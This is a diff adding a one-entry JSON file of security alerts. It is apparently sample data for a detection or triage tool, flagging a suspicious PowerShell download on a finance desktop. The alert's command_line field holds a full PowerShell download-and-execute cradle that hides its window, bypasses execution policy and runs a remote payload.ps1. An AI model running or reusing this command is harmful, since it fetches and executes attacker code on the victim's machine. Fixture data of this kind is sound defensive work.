@@ -1,0 +1,11 @@
+[
+    {
+        "alert_id": "1001",
+        "alert_name": "Suspicious Powershell Download",
+        "timestamp": "2026-03-13T10:00:00Z",
+        "host": "DESKTOP-FINANCE-02",
+        "source_ip": "198.51.100.55",
+        "file_hash": "44d88612fea8a8f36de82e1278abb02f",
+        "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.55/payload.ps1')\""
+    }
+]
